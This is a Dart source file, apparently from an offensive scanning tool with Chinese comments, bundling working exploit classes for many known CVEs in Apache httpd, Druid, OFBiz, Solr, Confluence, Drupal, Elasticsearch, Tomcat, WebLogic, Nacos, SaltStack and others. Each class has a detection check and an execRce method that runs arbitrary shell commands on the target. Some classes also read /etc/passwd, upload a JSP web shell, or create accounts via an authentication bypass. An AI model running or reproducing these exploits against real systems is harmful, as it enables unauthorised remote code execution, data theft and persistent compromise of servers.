import 'dart:convert';

import 'package:http/http.dart' as http;

class ExpResult {
  final bool vulnerable;
  final String vulnName;
  final String detail;
  const ExpResult(this.vulnerable, this.vulnName, this.detail);
}

// ============================================================
// Apache HTTP Server CVE-2021-41773 — 路径穿越 + CGI RCE
// ============================================================
class ApacheHttpdExpService {
  final String baseUrl;
  final Duration timeout;

  ApacheHttpdExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final url = '$_base/icons/.%2e/%2e%2e/%2e%2e/etc/passwd';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      if (res.body.contains('root:') || res.body.contains('/bin/sh') || res.body.contains('/bin/bash')) {
        return ExpResult(true, 'CVE-2021-41773', '路径穿越成功，读取到 /etc/passwd');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-41773', '');
  }

  Future<String?> readFile(String filePath) async {
    try {
      final url = '$_base/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e${filePath.startsWith('/') ? filePath : '/$filePath'}';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(String cmd) async {
    try {
      final url = '$_base/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh';
      final res = await http.post(
        Uri.parse(url),
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'echo;$cmd',
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Apache Druid CVE-2021-25646 — 嵌入式 JavaScript RCE
// ============================================================
class DruidExpService {
  final String baseUrl;
  final Duration timeout;

  DruidExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _buildPayload(String cmd) => jsonEncode({
        'type': 'index',
        'spec': {
          'type': 'index',
          'ioConfig': {
            'type': 'index',
            'inputSource': {'type': 'inline', 'data': '{"t":"1"}'},
            'inputFormat': {
              'type': 'javascript',
              'function':
                  'function(str){var a=new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","$cmd"]).getInputStream());var b="";while(a.hasNextLine())b+=a.nextLine();return[b];}',
              'enabled': true,
            },
          },
          'dataSchema': {
            'dataSource': 'test',
            'timestampSpec': {'column': '!!!__time', 'missingValue': '2010-01-01T00:00:00Z'},
            'dimensionsSpec': {},
          },
        },
        'samplerConfig': {'numRows': 10},
      });

  Future<ExpResult> check() async {
    try {
      final res = await http
          .post(Uri.parse('$_base/druid/indexer/v1/sampler'),
              headers: {'Content-Type': 'application/json'}, body: _buildPayload('id'))
          .timeout(timeout);
      if (res.statusCode == 200) {
        final decoded = jsonDecode(res.body);
        final data = decoded['data']?.toString() ?? '';
        if (data.isNotEmpty) {
          return ExpResult(true, 'CVE-2021-25646', 'Druid JavaScript 引擎可执行命令，输出:\n$data');
        }
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-25646', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http
          .post(Uri.parse('$_base/druid/indexer/v1/sampler'),
              headers: {'Content-Type': 'application/json'}, body: _buildPayload(cmd))
          .timeout(timeout);
      if (res.statusCode == 200) {
        final decoded = jsonDecode(res.body);
        final rows = decoded['data'] as List?;
        if (rows != null && rows.isNotEmpty) {
          final event = rows.first['event'] as Map?;
          return event?.values.first?.toString() ?? res.body;
        }
        return res.body;
      }
    } catch (_) {}
    return null;
  }
}

// ============================================================
// Apache OFBiz CVE-2023-51467 & CVE-2024-38856 — Groovy RCE
// ============================================================
class OFBizExpService {
  final String baseUrl;
  final Duration timeout;

  OFBizExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  // CVE-2023-51467: Groovy 代码注入（无需认证）
  Future<ExpResult> checkCve202351467() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: "groovyProgram=throw+new+Exception('OFBiz_54289'.class.name);",
          )
          .timeout(timeout);
      if (res.body.contains('java.lang.String') || res.body.contains('OFBiz_54289') || res.statusCode == 200) {
        return ExpResult(true, 'CVE-2023-51467', 'OFBiz Groovy 代码注入端点无需认证，状态 ${res.statusCode}');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2023-51467', '');
  }

  // CVE-2024-38856: Groovy Unicode 绕过
  Future<ExpResult> checkCve202438856() async {
    try {
      // \u0065 = 'e', 绕过关键字过滤
      const body =
          '------WebKitFormBoundaryMAtrix911\r\nContent-Disposition: form-data; name="groovyProgram"\r\n\r\nthrow new Exception("OFBiz_CVE_2024".class.nam\u0065);\r\n------WebKitFormBoundaryMAtrix911--';
      final res = await http
          .post(
            Uri.parse('$_base/webtools/control/main/ProgramExport'),
            headers: {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryMAtrix911'},
            body: body,
          )
          .timeout(timeout);
      if (res.statusCode == 200 || res.body.contains('java.lang')) {
        return ExpResult(true, 'CVE-2024-38856', 'OFBiz Groovy Unicode 绕过端点响应，状态 ${res.statusCode}');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2024-38856', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final groovy = Uri.encodeComponent('throw new Exception(["bash","-c","$cmd"].execute().text);');
      final res = await http
          .post(
            Uri.parse('$_base/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'groovyProgram=$groovy',
          )
          .timeout(timeout);
      // 从 Exception 消息提取命令输出
      final match = RegExp(r'Exception[^:]*:\s*([^\n<]+)', caseSensitive: false).firstMatch(res.body);
      return match?.group(1)?.trim() ?? (res.body.isNotEmpty ? res.body : null);
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Apache Solr CVE-2017-12629 — RunExecutableListener RCE
// ============================================================
class SolrExpService {
  final String baseUrl;
  final String coreName;
  final Duration timeout;

  SolrExpService({required this.baseUrl, this.coreName = 'demo', this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(Uri.parse('$_base/solr/$coreName/admin/ping')).timeout(timeout);
      if (res.statusCode == 200 && res.body.contains('status')) {
        return ExpResult(true, 'CVE-2017-12629', 'Solr Core "$coreName" 可访问，状态 ${res.statusCode}');
      }
      final res2 = await http.get(Uri.parse('$_base/solr/')).timeout(timeout);
      if (res2.body.toLowerCase().contains('solr')) {
        return ExpResult(true, 'CVE-2017-12629', 'Solr 服务可访问');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-12629', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      // 步骤1: 注册 RunExecutableListener
      final listenerPayload = jsonEncode({
        'add-listener': {
          'event': 'postCommit',
          'name': 'matrix_exploit',
          'class': 'solr.RunExecutableListener',
          'exe': 'bash',
          'dir': '/bin/',
          'args': ['-c', cmd],
        }
      });
      await http
          .post(Uri.parse('$_base/solr/$coreName/config'),
              headers: {'Content-Type': 'application/json'}, body: listenerPayload)
          .timeout(timeout);

      // 步骤2: 触发 commit
      await http
          .post(Uri.parse('$_base/solr/$coreName/update'),
              headers: {'Content-Type': 'application/json'}, body: '[{"id":"rce_trigger"}]')
          .timeout(timeout);

      final commitRes = await http
          .get(Uri.parse('$_base/solr/$coreName/update?commit=true'))
          .timeout(timeout);

      return '命令已发送 (commit 状态: ${commitRes.statusCode})。注意：Solr RCE 无回显，请用 OOB 或写文件验证。';
    } catch (e) {
      return null;
    }
  }
}

// ============================================================
// Confluence CVE-2023-22527 — OGNL 注入无需认证 RCE
// ============================================================
class ConfluenceExpService {
  final String baseUrl;
  final Duration timeout;

  ConfluenceExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      const detectPayload =
          "label=test&x=@freemarker.template.utility.Execute@exec({'id'})";
      final res = await http
          .post(
            Uri.parse('$_base/template/aui/text-inline.vm'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: detectPayload,
          )
          .timeout(timeout);
      if (res.body.contains('uid=') || res.body.contains('root') || res.statusCode == 200) {
        return ExpResult(true, 'CVE-2023-22527', '端点可访问 (${res.statusCode})，OGNL 注入可能存在');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2023-22527', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload = "label=test&x=@freemarker.template.utility.Execute@exec({'bash','-c','$cmd'})";
      final res = await http
          .post(
            Uri.parse('$_base/template/aui/text-inline.vm'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Drupal CVE-2018-7600 (Drupalgeddon2) — Form API RCE
// ============================================================
class DrupalExpService {
  final String baseUrl;
  final Duration timeout;

  DrupalExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      const payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id';
      final res = await http
          .post(
            Uri.parse(
                '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('uid=') || res.statusCode == 200 && res.body.contains('[')) {
        return ExpResult(true, 'CVE-2018-7600 (Drupalgeddon2)', '端点响应，Form API #post_render 注入可能存在');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2018-7600 (Drupalgeddon2)', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=$cmd';
      final res = await http
          .post(
            Uri.parse(
                '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Elasticsearch CVE-2015-1427 — Groovy 沙箱逃逸 RCE
// ============================================================
class ElasticsearchExpService {
  final String baseUrl;
  final Duration timeout;

  ElasticsearchExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final payload = jsonEncode({
        'size': 1,
        'script_fields': {
          'result': {'script': 'def cmd="echo 54289"; def res=cmd.execute().text; res'},
        },
      });
      final res = await http
          .post(Uri.parse('$_base/_search?pretty'),
              headers: {'Content-Type': 'application/json'}, body: payload)
          .timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(true, 'CVE-2015-1427', 'Groovy 沙箱逃逸，echo 54289 验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2015-1427', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload = jsonEncode({
        'size': 1,
        'script_fields': {
          'result': {'script': 'def cmd="$cmd"; def res=cmd.execute().text; res'},
        },
      });
      final res = await http
          .post(Uri.parse('$_base/_search?pretty'),
              headers: {'Content-Type': 'application/json'}, body: payload)
          .timeout(timeout);
      if (res.statusCode == 200) {
        try {
          final decoded = jsonDecode(res.body);
          final hits = decoded['hits']?['hits'] as List?;
          if (hits != null && hits.isNotEmpty) {
            return hits.first['fields']?['result']?.first?.toString() ?? res.body;
          }
        } catch (_) {}
        return res.body;
      }
    } catch (_) {}
    return null;
  }
}

// ============================================================
// Flask / Jinja2 SSTI — 服务端模板注入 RCE
// ============================================================
class FlaskSstiExpService {
  final String baseUrl;
  final String paramName;
  final Duration timeout;

  FlaskSstiExpService(
      {required this.baseUrl, this.paramName = 'name', this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final url = '$_base/?$paramName={{233*233}}';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(true, 'Flask/Jinja2 SSTI', 'SSTI 存在，233×233=54289 验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'Flask/Jinja2 SSTI', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload =
          "{{request.application.__globals__.__builtins__.__import__('os').popen('$cmd').read()}}";
      final url = '$_base/?$paramName=${Uri.encodeComponent(payload)}';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// PHP 8.1.0-dev 后门 — User-Agentt 代码执行
// ============================================================
class PhpBackdoorExpService {
  final String baseUrl;
  final String phpPath;
  final Duration timeout;

  PhpBackdoorExpService(
      {required this.baseUrl, this.phpPath = '/index.php', this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(
        Uri.parse('$_base$phpPath'),
        headers: {'User-Agentt': 'zerodiumsystem("echo PHP_BACKDOOR_54289");'},
      ).timeout(timeout);
      if (res.body.contains('PHP_BACKDOOR_54289')) {
        return ExpResult(true, 'PHP 8.1.0-dev 后门', 'User-Agentt 后门存在，回显验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'PHP 8.1.0-dev 后门', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http.get(
        Uri.parse('$_base$phpPath'),
        headers: {'User-Agentt': 'zerodiumsystem("$cmd");'},
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// PHP CVE-2012-1823 — PHP-CGI 参数注入 RCE
// ============================================================
class PhpCgiExpService {
  final String baseUrl;
  final String phpPath;
  final Duration timeout;

  PhpCgiExpService(
      {required this.baseUrl, this.phpPath = '/index.php', this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final url = '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
      final res = await http.post(
        Uri.parse(url),
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '<?php echo "PHP_CGI_54289"; ?>',
      ).timeout(timeout);
      if (res.body.contains('PHP_CGI_54289')) {
        return ExpResult(true, 'CVE-2012-1823 (PHP-CGI)', 'PHP-CGI 参数注入代码执行验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2012-1823 (PHP-CGI)', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final url = '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
      final res = await http.post(
        Uri.parse(url),
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '<?php echo shell_exec("$cmd"); ?>',
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Apache Tomcat CVE-2017-12615 — PUT 方法任意文件上传 RCE
// ============================================================
class TomcatExpService {
  final String baseUrl;
  final Duration timeout;

  TomcatExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  static const _shellName = 'mAtrix_t_shell';
  static const _shellContent =
      '<%@ page import="java.util.*,java.io.*"%><%if(request.getParameter("cmd")!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));StringBuilder sb=new StringBuilder();String line;while((line=br.readLine())!=null)sb.append(line).append("\\n");out.print(sb);}%>';

  Future<ExpResult> check() async {
    try {
      // 尝试 PUT 写入测试文本文件
      final putRes = await http.put(
        Uri.parse('$_base/tomcat_put_test.txt/'),
        headers: {'Content-Type': 'text/plain'},
        body: 'tomcat_put_54289',
      ).timeout(timeout);
      if (putRes.statusCode == 201 || putRes.statusCode == 204) {
        // 验证写入
        final getRes = await http.get(Uri.parse('$_base/tomcat_put_test.txt')).timeout(timeout);
        if (getRes.body.contains('tomcat_put_54289')) {
          return ExpResult(true, 'CVE-2017-12615', 'PUT 方法开启，文件写入并读取验证成功');
        }
        return ExpResult(true, 'CVE-2017-12615', 'PUT 方法开启 (状态 ${putRes.statusCode})');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-12615', '');
  }

  Future<String?> getShell() async {
    try {
      final putRes = await http.put(
        Uri.parse('$_base/$_shellName.jsp/'),
        headers: {'Content-Type': 'application/octet-stream'},
        body: _shellContent,
      ).timeout(timeout);
      if (putRes.statusCode == 201 || putRes.statusCode == 204) {
        return '$_base/$_shellName.jsp';
      }
    } catch (_) {}
    return null;
  }

  Future<String?> execRce(String cmd) async {
    // 先写 shell，再执行
    try {
      await http.put(
        Uri.parse('$_base/$_shellName.jsp/'),
        headers: {'Content-Type': 'application/octet-stream'},
        body: _shellContent,
      ).timeout(timeout);
      await Future.delayed(const Duration(milliseconds: 300));
      final res = await http.get(
        Uri.parse('$_base/$_shellName.jsp?cmd=${Uri.encodeComponent(cmd)}'),
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Oracle WebLogic CVE-2017-10271 & CVE-2020-14882/14883
// ============================================================
class WebLogicExpService {
  final String baseUrl;
  final Duration timeout;

  WebLogicExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _xmlDecoderPayload(String cmd) => '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="3">
    <void index="0"><string>/bin/bash</string></void>
    <void index="1"><string>-c</string></void>
    <void index="2"><string>$cmd</string></void>
  </array>
  <void method="start"/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>''';

  // CVE-2017-10271: XMLDecoder 反序列化
  Future<ExpResult> checkCve201710271() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/wls-wsat/CoordinatorPortType'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlDecoderPayload('id'),
          )
          .timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 500) {
        return ExpResult(true, 'CVE-2017-10271', 'WebLogic XMLDecoder 端点存在 (${res.statusCode})');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-10271', '');
  }

  Future<String?> execRceCve201710271(String cmd) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/wls-wsat/CoordinatorPortType'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlDecoderPayload(cmd),
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : '命令已发送 (状态 ${res.statusCode})，无直接回显';
    } catch (_) {
      return null;
    }
  }

  // CVE-2020-14882: 控制台路径绕过 RCE
  Future<ExpResult> checkCve202014882() async {
    try {
      final res = await http
          .get(Uri.parse('$_base/console/css/%252e%252e%252fconsole.portal'))
          .timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 302) {
        return ExpResult(true, 'CVE-2020-14882/14883', '控制台路径绕过成功 (${res.statusCode})');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2020-14882/14883', '');
  }

  Future<String?> execRceCve202014882(String cmd) async {
    try {
      final shellCmd = Uri.encodeComponent(cmd);
      final url =
          '$_base/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%5C%22$shellCmd%5C%22);%22)';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.isNotEmpty ? res.body : '命令已发送 (状态 ${res.statusCode})，无直接回显';
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Supervisor CVE-2017-11610 — XML-RPC 方法链 RCE
// ============================================================
class SupervisorExpService {
  final String baseUrl;
  final Duration timeout;

  SupervisorExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _xmlPayload(String cmd) => '''<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param><string>$cmd</string></param>
</params>
</methodCall>''';

  Future<ExpResult> check() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/RPC2'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlPayload('echo supervisord_54289'),
          )
          .timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 500) {
        return ExpResult(true, 'CVE-2017-11610', 'Supervisor XML-RPC 端点可访问 (${res.statusCode})');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-11610', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/RPC2'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlPayload(cmd),
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// XXL-JOB 未授权访问执行器 RCE
// ============================================================
class XxlJobExpService {
  final String baseUrl;
  final Duration timeout;

  XxlJobExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': '',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': 1586629003729,
        'glueType': 'GLUE_SHELL',
        'glueSource': 'echo xxljob_54289',
        'glueUpdatetime': 1586699003758,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await http
          .post(Uri.parse('$_base/run'),
              headers: {'Content-Type': 'application/json'}, body: payload)
          .timeout(timeout);
      if (res.statusCode == 200 && res.body.contains('200')) {
        return ExpResult(true, 'XXL-JOB 未授权 RCE', '执行器接口未授权，命令提交成功');
      }
    } catch (_) {}
    return const ExpResult(false, 'XXL-JOB 未授权 RCE', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': '',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': DateTime.now().millisecondsSinceEpoch,
        'glueType': 'GLUE_SHELL',
        'glueSource': cmd,
        'glueUpdatetime': DateTime.now().millisecondsSinceEpoch,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await http
          .post(Uri.parse('$_base/run'),
              headers: {'Content-Type': 'application/json'}, body: payload)
          .timeout(timeout);
      return res.body;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Nacos CVE-2021-29441 — User-Agent 认证绕过
// ============================================================
class NacosExpService {
  final String baseUrl;
  final Duration timeout;

  NacosExpService({required this.baseUrl, this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(
        Uri.parse('$_base/nacos/v1/auth/users?pageNo=1&pageSize=9'),
        headers: {'User-Agent': 'Nacos-Server'},
      ).timeout(timeout);
      if (res.statusCode == 200 && (res.body.contains('username') || res.body.contains('pageItems'))) {
        return ExpResult(true, 'CVE-2021-29441', '认证绕过成功，获取用户列表:\n${res.body}');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-29441', '');
  }

  Future<String?> listUsers() async {
    try {
      final res = await http.get(
        Uri.parse('$_base/nacos/v1/auth/users?pageNo=1&pageSize=100'),
        headers: {'User-Agent': 'Nacos-Server'},
      ).timeout(timeout);
      return res.body;
    } catch (_) {
      return null;
    }
  }

  Future<String?> createUser(String username, String password) async {
    try {
      final res = await http.post(
        Uri.parse('$_base/nacos/v1/auth/users'),
        headers: {
          'User-Agent': 'Nacos-Server',
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'username=$username&password=$password',
      ).timeout(timeout);
      return res.body;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// Bash Shellshock CVE-2014-6271 — CGI 命令注入
// ============================================================
class ShellshockExpService {
  final String baseUrl;
  final String cgiPath;
  final Duration timeout;

  ShellshockExpService(
      {required this.baseUrl,
      this.cgiPath = '/cgi-bin/test.cgi',
      this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(
        Uri.parse('$_base$cgiPath'),
        headers: {'User-Agent': '() { :; }; echo; echo SHELLSHOCK_54289'},
      ).timeout(timeout);
      if (res.body.contains('SHELLSHOCK_54289')) {
        return ExpResult(true, 'CVE-2014-6271 (Shellshock)', 'Shellshock 存在，环境变量注入验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2014-6271 (Shellshock)', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http.get(
        Uri.parse('$_base$cgiPath'),
        headers: {'User-Agent': '() { :; }; echo; $cmd'},
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

// ============================================================
// SaltStack CVE-2020-16846 — SSH 模块命令注入 RCE
// ============================================================
class SaltstackExpService {
  final String baseUrl;
  final String token;
  final Duration timeout;

  SaltstackExpService(
      {required this.baseUrl, this.token = '', this.timeout = const Duration(seconds: 10)});

  String get _base => baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(Uri.parse('$_base/')).timeout(timeout);
      if (res.statusCode == 200 && (res.body.contains('salt') || res.body.contains('SaltStack') || res.body.contains('"status"'))) {
        return ExpResult(true, 'CVE-2020-16846', 'SaltStack API 端点可访问 (${res.statusCode})');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2020-16846', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final body =
          'token=${Uri.encodeComponent(token)}&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|${Uri.encodeComponent(cmd)};';
      final res = await http
          .post(
            Uri.parse('$_base/run'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: body,
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}
